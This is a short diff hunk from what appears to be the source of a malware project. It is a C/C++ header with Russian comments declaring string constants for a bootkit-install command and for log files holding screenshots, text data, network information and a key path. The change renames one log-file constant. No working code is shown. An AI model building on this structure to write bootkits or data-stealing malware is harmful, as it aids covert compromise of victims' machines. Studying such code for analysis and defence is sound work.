@@ -114,7 +114,7 @@ extern CSSTR EStrCommandInstallBootkit[];  // Команда на инсталяцию буткита
 
 // Имена файлов, для добавления в лог
 extern CSSTR StrLogFileScreenShot[];
-extern CSSTR StrLogFileInformation[];
+extern CSSTR StrLogFileTextData[];
 extern CSSTR StrLogFileNetInfo[];
 extern CSSTR EStrLogKeyPath[];
 
